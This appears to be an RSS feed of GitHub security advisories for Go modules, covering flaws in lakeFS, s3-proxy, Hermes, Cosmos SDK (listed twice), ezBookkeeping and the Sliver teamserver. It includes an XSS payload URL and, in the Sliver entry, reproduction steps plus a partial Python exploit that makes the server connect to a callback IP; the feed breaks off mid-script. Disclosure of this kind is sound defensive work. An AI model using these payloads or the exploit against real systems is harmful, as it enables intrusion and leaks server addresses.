<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2025-02-22T00:04:36.517Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/treeverse/lakefs] lakeFS allows an authenticated user to cause a crash by exhausting server memory]]></title>
        <id>https://github.com/advisories/GHSA-j7jw-28jm-whr6</id>
        <link href="https://github.com/advisories/GHSA-j7jw-28jm-whr6"/>
        <updated>2025-02-21T21:43:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An authenticated user can crash lakeFS by exhausting server memory.  This is an authenticated denial-of-service issue.</p>
<h3 id="patches">Patches</h3>
<p>This problem has been patched and exists in versions 1.49.1 and below</p>
<h3 id="workarounds">Workarounds</h3>
<p>On S3 backends, configure</p>
<pre><code class="language-yaml"># ...
blockstore:
  s3:
    disable_pre_signed_multipart: true
</code></pre>
<p>or set environment variable <code>LAKEFS_BLOCKSTORE_S3_DISABLE_PRE_SIGNED_MULTIPART</code> to <code>true</code>.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/treeverse/lakeFS/security/advisories/GHSA-j7jw-28jm-whr6">https://github.com/treeverse/lakeFS/security/advisories/GHSA-j7jw-28jm-whr6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27100">https://nvd.nist.gov/vuln/detail/CVE-2025-27100</a></li>
<li><a href="https://github.com/treeverse/lakeFS/commit/3a625752acdf3f8e137bec20451e71d0f9fa82f2">https://github.com/treeverse/lakeFS/commit/3a625752acdf3f8e137bec20451e71d0f9fa82f2</a></li>
<li><a href="https://github.com/advisories/GHSA-j7jw-28jm-whr6">https://github.com/advisories/GHSA-j7jw-28jm-whr6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j7jw-28jm-whr6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-21T21:43:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/oxyno-zeta/s3-proxy/cmd/s3-proxy] S3-Proxy allows Reflected Cross-site Scripting (XSS) in template implementation]]></title>
        <id>https://github.com/advisories/GHSA-pp9m-qf39-hxjc</id>
        <link href="https://github.com/advisories/GHSA-pp9m-qf39-hxjc"/>
        <updated>2025-02-21T16:10:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Reflected Cross-site Scripting (XSS) vulnerability enables attackers to create malicious URLs that, when visited, inject scripts into the web application. This can lead to session hijacking or phishing attacks on a trusted domain, posing a high risk to all users.</p>
<h3 id="details">Details</h3>
<p><em>Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.</em>
It's possible to inject html elements, including scripts through the <a href="https://github.com/oxyno-zeta/s3-proxy/blob/master/templates/folder-list.tpl#L19C21-L19C38">folder-list template</a>. It seems like the <code>.Request.URL.Path</code> variable is not escaped.</p>
<p>I did some research and found it might be due to the <code>text/template</code> import being used in <a href="https://github.com/oxyno-zeta/s3-proxy/blob/master/pkg/s3-proxy/utils/templateutils/template.go#L8">the template implementation</a>, instead of the <a href="https://pkg.go.dev/html/template">safer</a> <code>html/template</code>.</p>
<h3 id="poc">PoC</h3>
<p><em>Complete instructions, including specific configuration details, to reproduce the vulnerability.</em>
Using the <a href="https://oxyno-zeta.github.io/s3-proxy/configuration/structure/#targettemplateconfig">default template configuration</a>, the vulnerability can be reproduced with the following steps.</p>
<ol>
<li><p>Navigate to <code>https://your-s3-proxy.com/path-not-found</code> and confirm the page looks as follows:
<img alt="image" src="https://github.com/user-attachments/assets/1c87e274-18ec-4eb3-94fe-25bb1c0abf37"></p>
</li>
<li><p>Try inserting an HTML element by changing <code>/path-not-found</code> to <code>/&lt;img src="x"&gt;</code> and confirm the page looks as follows:
<img alt="image" src="https://github.com/user-attachments/assets/19c80f46-c406-4e5f-81f3-16103bc963b8"></p>
</li>
<li><p>Now it should be possible to run any JavaScript by manipulating the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/img#image_loading_errors"><code>onerror</code> property of the img element</a>. This should make the link look like <code>https://your-s3-proxy.com/&lt;img src="x" onerror="alert(1)"&gt;</code>. Confirm that going to this URL will in fact shows an alert in the browser.</p>
</li>
</ol>
<h3 id="impact">Impact</h3>
<p>The affected template allows users to interact with the URL path provided by the <code>Request.URL.Path</code> variable, which is then rendered directly into the HTML without proper sanitization or escaping. This can be abused by attackers who craft a malicious URL containing injected HTML or JavaScript. When users visit such a URL, the malicious script will be executed in the user's context, leading to potential risks such as:</p>
<ul>
<li><strong>Session Hijacking</strong>: Malicious scripts could be used to steal session cookies or other sensitive information.</li>
<li><strong>Phishing Attacks</strong>: JavaScript could be injected to trick users into submitting sensitive information, such as login credentials.</li>
</ul>
<p>This vulnerability can be exploited by attackers who craft URLs containing malicious payloads, which would then execute in the user's browser when they access the affected page. This poses a <strong>high</strong> risk to all users who visit such URLs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/oxyno-zeta/s3-proxy/security/advisories/GHSA-pp9m-qf39-hxjc">https://github.com/oxyno-zeta/s3-proxy/security/advisories/GHSA-pp9m-qf39-hxjc</a></li>
<li><a href="https://github.com/oxyno-zeta/s3-proxy/commit/c611c741ed4872ea3f46232be23bb830f96f9564">https://github.com/oxyno-zeta/s3-proxy/commit/c611c741ed4872ea3f46232be23bb830f96f9564</a></li>
<li><a href="https://github.com/oxyno-zeta/s3-proxy/releases/tag/v4.18.1">https://github.com/oxyno-zeta/s3-proxy/releases/tag/v4.18.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27088">https://nvd.nist.gov/vuln/detail/CVE-2025-27088</a></li>
<li><a href="https://github.com/oxyno-zeta/s3-proxy/blob/master/templates/folder-list.tpl#L19C21-L19C38">https://github.com/oxyno-zeta/s3-proxy/blob/master/templates/folder-list.tpl#L19C21-L19C38</a></li>
<li><a href="https://github.com/advisories/GHSA-pp9m-qf39-hxjc">https://github.com/advisories/GHSA-pp9m-qf39-hxjc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pp9m-qf39-hxjc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-20T22:18:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hashicorp-forge/hermes] Hermes improperly validates a JWT]]></title>
        <id>https://github.com/advisories/GHSA-vxm9-8mfw-vc6g</id>
        <link href="https://github.com/advisories/GHSA-vxm9-8mfw-vc6g"/>
        <updated>2025-02-20T20:19:02.000Z</updated>
        <content type="html"><![CDATA[<p>Hermes versions up to 0.4.0 improperly validated the JWT provided when using the AWS ALB authentication mode, potentially allowing for authentication bypass. This vulnerability, CVE-2025-1293, was fixed in Hermes 0.5.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1293">https://nvd.nist.gov/vuln/detail/CVE-2025-1293</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2025-03-hashicorp-hermes-improperly-validates-aws-alb-jwts-which-may-lead-to-authentication-bypass/73371">https://discuss.hashicorp.com/t/hcsec-2025-03-hashicorp-hermes-improperly-validates-aws-alb-jwts-which-may-lead-to-authentication-bypass/73371</a></li>
<li><a href="https://github.com/hashicorp-forge/hermes/commit/e36d479616099bd0c8dfde6786ea671f112d9106">https://github.com/hashicorp-forge/hermes/commit/e36d479616099bd0c8dfde6786ea671f112d9106</a></li>
<li><a href="https://github.com/advisories/GHSA-vxm9-8mfw-vc6g">https://github.com/advisories/GHSA-vxm9-8mfw-vc6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vxm9-8mfw-vc6g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-20T03:32:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/cosmos-sdk] Cosmos SDK: Groups module can halt chain when handling a malicious proposal]]></title>
        <id>https://github.com/advisories/GHSA-x5vx-95h7-rv4p</id>
        <link href="https://github.com/advisories/GHSA-x5vx-95h7-rv4p"/>
        <updated>2025-02-20T20:18:26.000Z</updated>
        <content type="html"><![CDATA[<p>Name: ASA-2025-003: Groups module can halt chain when handling a malicious proposal
Component: CosmosSDK
Criticality: High (Considerable Impact; Likely Likelihood per <a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1.2</a>)
Affected versions: &lt;= v0.47.15, &lt;= 0.50.11
Affected users: Validators, Full nodes, Users on chains that utilize the groups module</p>
<h3 id="description">Description</h3>
<p>An issue was discovered in the groups module where a malicious proposal would result in a division by zero, and subsequently halt a chain due to the resulting error. Any user that can interact with the groups module can introduce this state.</p>
<h3 id="patches">Patches</h3>
<p>The new Cosmos SDK release <a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.12">v0.50.12</a> and <a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.16">v0.47.16</a> fix this issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no known workarounds for this issue.  It is advised that chains apply the update.</p>
<h3 id="timeline">Timeline</h3>
<ul>
<li>February 9, 2025, 5:18pm PST: Issue reported to the Cosmos Bug Bounty program</li>
<li>February 9, 2025, 8:12am PST: Issue triaged by Amulet on-call, and distributed to Core team</li>
<li>February 9, 2025, 12:25pm PST: Core team completes validation of issue</li>
<li>February 18, 2025, 8:00am PST / 17:00 CET: Pre-notification delivered</li>
<li>February 20, 2025, 8:00am PST / 17:00 CET: Patch made available</li>
</ul>
<p>This issue was reported to the Cosmos Bug Bounty Program by <a href="https://github.com/dongsam">dongsam</a> on HackerOne on February 9, 2025. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<p>If you have questions about Interchain security efforts, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>. For more information about the Interchain Foundation’s engagement with Amulet, and to sign up for security notification emails, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.  </p>
<p>A Github Security Advisory for this issue is available in the Cosmos SDK <a href="https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p">repository</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p">https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/commit/0a98b65b24900a0e608866c78f172cf8e4140aea">https://github.com/cosmos/cosmos-sdk/commit/0a98b65b24900a0e608866c78f172cf8e4140aea</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.16">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.16</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.12">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.12</a></li>
<li><a href="https://github.com/advisories/GHSA-x5vx-95h7-rv4p">https://github.com/advisories/GHSA-x5vx-95h7-rv4p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5vx-95h7-rv4p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-20T20:18:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/cosmos-sdk] Cosmos SDK: Groups module can halt chain when handling a malicious proposal]]></title>
        <id>https://github.com/advisories/GHSA-x5vx-95h7-rv4p</id>
        <link href="https://github.com/advisories/GHSA-x5vx-95h7-rv4p"/>
        <updated>2025-02-20T20:18:26.000Z</updated>
        <content type="html"><![CDATA[<p>Name: ASA-2025-003: Groups module can halt chain when handling a malicious proposal
Component: CosmosSDK
Criticality: High (Considerable Impact; Likely Likelihood per <a href="https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md">ACMv1.2</a>)
Affected versions: &lt;= v0.47.15, &lt;= 0.50.11
Affected users: Validators, Full nodes, Users on chains that utilize the groups module</p>
<h3 id="description">Description</h3>
<p>An issue was discovered in the groups module where a malicious proposal would result in a division by zero, and subsequently halt a chain due to the resulting error. Any user that can interact with the groups module can introduce this state.</p>
<h3 id="patches">Patches</h3>
<p>The new Cosmos SDK release <a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.12">v0.50.12</a> and <a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.16">v0.47.16</a> fix this issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no known workarounds for this issue.  It is advised that chains apply the update.</p>
<h3 id="timeline">Timeline</h3>
<ul>
<li>February 9, 2025, 5:18pm PST: Issue reported to the Cosmos Bug Bounty program</li>
<li>February 9, 2025, 8:12am PST: Issue triaged by Amulet on-call, and distributed to Core team</li>
<li>February 9, 2025, 12:25pm PST: Core team completes validation of issue</li>
<li>February 18, 2025, 8:00am PST / 17:00 CET: Pre-notification delivered</li>
<li>February 20, 2025, 8:00am PST / 17:00 CET: Patch made available</li>
</ul>
<p>This issue was reported to the Cosmos Bug Bounty Program by <a href="https://github.com/dongsam">dongsam</a> on HackerOne on February 9, 2025. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.</p>
<p>If you have questions about Interchain security efforts, please reach out to our official communication channel at <a href="mailto:security@interchain.io">security@interchain.io</a>. For more information about the Interchain Foundation’s engagement with Amulet, and to sign up for security notification emails, please see <a href="https://github.com/interchainio/security">https://github.com/interchainio/security</a>.  </p>
<p>A Github Security Advisory for this issue is available in the Cosmos SDK <a href="https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p">repository</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p">https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/commit/0a98b65b24900a0e608866c78f172cf8e4140aea">https://github.com/cosmos/cosmos-sdk/commit/0a98b65b24900a0e608866c78f172cf8e4140aea</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.16">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.47.16</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.12">https://github.com/cosmos/cosmos-sdk/releases/tag/v0.50.12</a></li>
<li><a href="https://github.com/advisories/GHSA-x5vx-95h7-rv4p">https://github.com/advisories/GHSA-x5vx-95h7-rv4p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5vx-95h7-rv4p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-20T20:18:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mayswind/ezbookkeeping] MaysWind ezBookkeeping has Improper Privilege Management]]></title>
        <id>https://github.com/advisories/GHSA-mpg8-8x9c-p9gv</id>
        <link href="https://github.com/advisories/GHSA-mpg8-8x9c-p9gv"/>
        <updated>2025-02-20T00:12:38.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in MaysWind ezBookkeeping 0.7.0 allows a remote attacker to escalate privileges via the token component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57604">https://nvd.nist.gov/vuln/detail/CVE-2024-57604</a></li>
<li><a href="https://github.com/mayswind/ezbookkeeping/issues/33">https://github.com/mayswind/ezbookkeeping/issues/33</a></li>
<li><a href="https://hkohi.ca/vulnerability/2">https://hkohi.ca/vulnerability/2</a></li>
<li><a href="https://github.com/advisories/GHSA-mpg8-8x9c-p9gv">https://github.com/advisories/GHSA-mpg8-8x9c-p9gv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mpg8-8x9c-p9gv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-13T00:33:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/bishopfox/sliver] SSRF in sliver teamserver]]></title>
        <id>https://github.com/advisories/GHSA-fh4v-v779-4g2w</id>
        <link href="https://github.com/advisories/GHSA-fh4v-v779-4g2w"/>
        <updated>2025-02-20T22:47:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The reverse port forwarding in sliver teamserver allows the implant to open a reverse tunnel on the sliver teamserver without verifying if the operator instructed the implant to do so</p>
<h3 id="reproduction-steps">Reproduction steps</h3>
<p>Run server</p>
<pre><code>wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
chmod +x sliver-server_linux
./sliver-server_linux
</code></pre>
<p>Generate binary</p>
<pre><code>generate --mtls 127.0.0.1:8443
</code></pre>
<p>Run it on windows, then <code>Task manager -&gt; find process -&gt; Create memory dump file</code></p>
<p>Install RogueSliver and get the certs</p>
<pre><code>git clone https://github.com/ACE-Responder/RogueSliver.git
pip3 install -r requirements.txt --break-system-packages
python3 ExtractCerts.py implant.dmp
</code></pre>
<p>Start callback listener. Teamserver will connect when POC is run and send "ssrf poc" to nc</p>
<pre><code>nc -nvlp 1111
</code></pre>
<p>Run the poc (pasted at bottom of this file)</p>
<pre><code>python3 poc.py &lt;SLIVER IP&gt; &lt;MTLS PORT&gt; &lt;CALLBACK IP&gt; &lt;CALLBACK PORT&gt;
python3 poc.py 192.168.1.33 8443 44.221.186.72 1111
</code></pre>
<h3 id="details">Details</h3>
<p>We see here an envelope is read from the connection and if the envelope.Type matches a handler the handler will be executed</p>
<pre><code class="language-go">func handleSliverConnection(conn net.Conn) {
    mtlsLog.Infof("Accepted incoming connection: %s", conn.RemoteAddr())
    implantConn := core.NewImplantConnection(consts.MtlsStr, conn.RemoteAddr().String())

    defer func() {
        mtlsLog.Debugf("mtls connection closing")
        conn.Close()
        implantConn.Cleanup()
    }()

    done := make(chan bool)
    go func() {
        defer func() {
            done &lt;- true
        }()
        handlers := serverHandlers.GetHandlers()
        for {
            envelope, err := socketReadEnvelope(conn)
            if err != nil {
                mtlsLog.Errorf("Socket read error %v", err)
                return
            }
            implantConn.UpdateLastMessage()
            if envelope.ID != 0 {
                implantConn.RespMutex.RLock()
                if resp, ok := implantConn.Resp[envelope.ID]; ok {
                    resp &lt;- envelope // Could deadlock, maybe want to investigate better solutions
                }
                implantConn.RespMutex.RUnlock()
            } else if handler, ok := handlers[envelope.Type]; ok {
                mtlsLog.Debugf("Received new mtls message type %d, data: %s", envelope.Type, envelope.Data)
                go func() {
                    respEnvelope := handler(implantConn, envelope.Data)
                    if respEnvelope != nil {
                        implantConn.Send &lt;- respEnvelope
                    }
                }()
            }
        }
    }()

Loop:
    for {
        select {
        case envelope := &lt;-implantConn.Send:
            err := socketWriteEnvelope(conn, envelope)
            if err != nil {
                mtlsLog.Errorf("Socket write failed %v", err)
                break Loop
            }
        case &lt;-done:
            break Loop
        }
    }
    mtlsLog.Debugf("Closing implant connection %s", implantConn.ID)
}
</code></pre>
<p>The available handlers:</p>
<pre><code class="language-go">func GetHandlers() map[uint32]ServerHandler {
    return map[uint32]ServerHandler{
        // Sessions
        sliverpb.MsgRegister:    registerSessionHandler,
        sliverpb.MsgTunnelData:  tunnelDataHandler,
        sliverpb.MsgTunnelClose: tunnelCloseHandler,
        sliverpb.MsgPing:        pingHandler,
        sliverpb.MsgSocksData:   socksDataHandler,

        // Beacons
        sliverpb.MsgBeaconRegister: beaconRegisterHandler,
        sliverpb.MsgBeaconTasks:    beaconTasksHandler,

        // Pivots
        sliverpb.MsgPivotPeerEnvelope: pivotPeerEnvelopeHandler,
        sliverpb.MsgPivotPeerFailure:  pivotPeerFailureHandler,
    }
}
</code></pre>
<p>If we send an envelope with the envelope.Type equaling MsgTunnelData, we will enter the <code>tunnelDataHandler</code> function</p>
<pre><code class="language-go">// The handler mutex prevents a send on a closed channel, without it
// two handlers calls may race when a tunnel is quickly created and closed.
func tunnelDataHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {
    session := core.Sessions.FromImplantConnection(implantConn)
    if session == nil {
        sessionHandlerLog.Warnf("Received tunnel data from unknown session: %v", implantConn)
        return nil
    }
    tunnelHandlerMutex.Lock()
    defer tunnelHandlerMutex.Unlock()
    tunnelData := &amp;sliverpb.TunnelData{}
    proto.Unmarshal(data, tunnelData)

    sessionHandlerLog.Debugf("[DATA] Sequence on tunnel %d, %d, data: %s", tunnelData.TunnelID, tunnelData.Sequence, tunnelData.Data)

    rtunnel := rtunnels.GetRTunnel(tunnelData.TunnelID)
    if rtunnel != nil &amp;&amp; session.ID == rtunnel.SessionID {
        RTunnelDataHandler(tunnelData, rtunnel, implantConn)
    } else if rtunnel != nil &amp;&amp; session.ID != rtunnel.SessionID {
        sessionHandlerLog.Warnf("Warning: Session %s attempted to send data on reverse tunnel it did not own", session.ID)
    } else if rtunnel == nil &amp;&amp; tunnelData.CreateReverse == true {
        createReverseTunnelHandler(implantConn, data)
        //RTunnelDataHandler(tunnelData, rtunnel, implantConn)
    } else {
        tunnel := core.Tunnels.Get(tunnelData.TunnelID)
        if tunnel != nil {
            if session.ID == tunnel.SessionID {
                tunnel.SendDataFromImplant(tunnelData)
            } else {
                sessionHandlerLog.Warnf("Warning: Session %s attempted to send data on tunnel it did not own", session.ID)
            }
        } else {
            sessionHandlerLog.Warnf("Data sent on nil tunnel %d", tunnelData.TunnelID)
        }
    }

    return nil
}
</code></pre>
<p>The <code>createReverseTunnelHandler</code> reads the envelope, creating a socket for <code>req.Rportfwd.Host</code> and <code>req.Rportfwd.Port</code>.  It will write <code>recv.Data</code> to it</p>
<pre><code class="language-go">func createReverseTunnelHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {
    session := core.Sessions.FromImplantConnection(implantConn)

    req := &amp;sliverpb.TunnelData{}
    proto.Unmarshal(data, req)

    var defaultDialer = new(net.Dialer)

    remoteAddress := fmt.Sprintf("%s:%d", req.Rportfwd.Host, req.Rportfwd.Port)

    ctx, cancelContext := context.WithCancel(context.Background())

    dst, err := defaultDialer.DialContext(ctx, "tcp", remoteAddress)
    //dst, err := net.Dial("tcp", remoteAddress)
    if err != nil {
        tunnelClose, _ := proto.Marshal(&amp;sliverpb.TunnelData{
            Closed:   true,
            TunnelID: req.TunnelID,
        })
        implantConn.Send &lt;- &amp;sliverpb.Envelope{
            Type: sliverpb.MsgTunnelClose,
            Data: tunnelClose,
        }
        cancelContext()
        return nil
    }

    if conn, ok := dst.(*net.TCPConn); ok {
        // {{if .Config.Debug}}
        //log.Printf("[portfwd] Configuring keep alive")
        // {{end}}
        conn.SetKeepAlive(true)
        // TODO: Make KeepAlive configurable
        conn.SetKeepAlivePeriod(1000 * time.Second)
    }

    tunnel := rtunnels.NewRTunnel(req.TunnelID, session.ID, dst, dst)
    rtunnels.AddRTunnel(tunnel)
    cleanup := func(reason error) {
        // {{if .Config.Debug}}
        sessionHandlerLog.Infof("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
        // {{end}}
        tunnel := rtunnels.GetRTunnel(tunnel.ID)
        rtunnels.RemoveRTunnel(tunnel.ID)
        dst.Close()
        cancelContext()
    }

    go func() {
        tWriter := tunnelWriter{
            tun:  tunnel,
            conn: implantConn,
        }
        // portfwd only uses one reader, hence the tunnel.Readers[0]
        n, err := io.Copy(tWriter, tunnel.Readers[0])
        _ = n // avoid not used compiler error if debug mode is disabled
        // {{if .Config.Debug}}
        sessionHandlerLog.Infof("[tunnel] Tunnel done, wrote %v bytes", n)
        // {{end}}

        cleanup(err)
    }()

    tunnelDataCache.Add(tunnel.ID, req.Sequence, req)

    // NOTE: The read/write semantics can be a little mind boggling, just remember we're reading
    // from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence
    // is used here whereas WriteSequence is used for data written back to the server

    // Go through cache and write all sequential data to the reader
    for recv, ok := tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()); ok; recv, ok = tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()) {
        // {{if .Config.Debug}}
        //sessionHandlerLog.Infof("[tunnel] Write %d bytes to tunnel %d (read seq: %d)", len(recv.Data), recv.TunnelID, recv.Sequence)
        // {{end}}
        tunnel.Writer.Write(recv.Data)

        // Delete the entry we just wrote from the cache
        tunnelDataCache.DeleteSeq(tunnel.ID, tunnel.ReadSequence())
        tunnel.IncReadSequence() // Increment sequence counter

        // {{if .Config.Debug}}
        //sessionHandlerLog.Infof("[message just received] %v", tunnelData)
        // {{end}}
    }

    //If cache is building up it probably means a msg was lost and the server is currently hung waiting for it.
    //Send a Resend packet to have the msg resent from the cache
    if tunnelDataCache.Len(tunnel.ID) &gt; 3 {
        data, err := proto.Marshal(&amp;sliverpb.TunnelData{
            Sequence: tunnel.WriteSequence(), // The tunnel write sequence
            Ack:      tunnel.ReadSequence(),
            Resend:   true,
            TunnelID: tunnel.ID,
            Data:     []byte{},
        })
        if err != nil {
            // {{if .Config.Debug}}
            //sessionHandlerLog.Infof("[shell] Failed to marshal protobuf %s", err)
            // {{end}}
        } else {
            // {{if .Config.Debug}}
            //sessionHandlerLog.Infof("[tunnel] Requesting resend of tunnelData seq: %d", tunnel.ReadSequence())
            // {{end}}
            implantConn.RequestResend(data)
        }
    }
    return nil
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>For current POC, mostly just leaking teamserver origin IP behind redirectors. I am 99% sure you can get full read SSRF but POC is blind only right now</p>
<p>To exploit this for MTLS listeners, you will need MTLS keys
For HTTP listeners, you will need to generate valid nonce
Not sure about other transport types</p>
<h3 id="poc">POC</h3>
<p>POC code, it is not cleaned up at all, please forgive me</p>
<pre><code class="language-python">#!/usr/bin/python
import sys
import time
import base64
import socket, ssl
from RogueSliver.consts import msgs
import random
import struct
import RogueSliver.sliver_pb2 as sliver
import json
import argparse
import uuid
from google.protobuf import json_format
from rich import print
import random
import string

ssl_ctx = ssl.create_default_context()
ssl_ctx.load_cert_chain(keyfile='certs/client.key',certfile='certs/client.crt')#,ca_certs='sliver/ca.crt')
ssl_ctx.load_verify_locations('certs/ca.crt')
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE



def generate_random_string(length=8):
    # Combine letters and digits
    characters = string.ascii_letters + string.digits
    # Generate random string
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def rand_unicode(junk_sz):
  junk = ''.join([chr(random.randint(0,2047)) for x in range(junk_sz)]).encode('utf-8','surrogatepass').decode()
  return(junk)

def junk_register(junk_sz):
  n = generate_random_string()
  register = {
        "Name": "chebuya"+n,
        "Hostname": "chebuya.local"+n,
        "Uuid": "uuid"+n,
        "Username": "username"+n,
        "Uid": "uid"+n,
        "Gid": "gid"+n,
        "Os": "os"+n,
        "Arch": "arch"+n,
        "Pid": 10,
        "Filename": "filename"+n,
        "ActiveC2": "activec2"+n,
        "Version": "version"+n,
        "ReconnectInterval": 60,
        "ConfigID": "config_id"+n,
        "PeerID": -1,
        "Locale": "locale" + n
  }

  return register



def make_ping_env():
  reg = sliver.Ping()
  json_format.Parse(json.dumps({}),reg)
  envelope = sliver.Envelope()
  envelope.Type = msgs.index('Ping')
  envelope.Data = reg.SerializeToString()

  return envelope



def make_rt_env():
    
    jdata = {
            "Data": "c3NyZiBwb2M=",
            "Closed": False,
            "Sequence": 0,
            "Ack": 0,
            "Resend": False,
            "CreateReverse": True,
            "rportfwd": {
                "Port": int(sys.argv[4]),
                "Host": sys.argv[3],
                "TunnelID": 0,
            },
            "TunnelID": 0,
    }



    reg = sliver.TunnelData()
    json_format.Parse(json.dumps(jdata),reg)
    envelope = sliver.Envelope()
    envelope.Type = msgs.index('TunnelData')
    envelope.Data = reg.SerializeToString()

    return envelope




def send_envelope(envelope,ip,port):
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    with ssl_ctx.wrap_socket(s,) as ssock:
      ssock.connect((ip,port))

      print(len(envelope.SerializeToString()))
      #data_len = struct.pack('!I', len(envelope.SerializeToString()) )
      data_len = struct.pack('I', len(envelope.SerializeToString()) )




      envelope3 = make_rt_env()
      data_len3 = struct.pack('I', len(envelope3.SerializeToString()) )

      print(data_len)

      ssock.write(data_len + envelope.SerializeToString()) 
      ssock.write(data_len3 + envelope3.SerializeToString())



    
      # No idea why this is reqauired
      while True:
          time.sleep(2)
          ssock.write(data_len3 + envelope3.SerializeToString())



def register_session(ip,port):
  print('[yellow]\[i][/yellow] Sending session registration.')
  reg = sliver.Register()
  json_format.Parse(json.dumps(junk_register(50)),reg)
  envelope = sliver.Envelope()
  envelope.Type = msgs.index('Register')
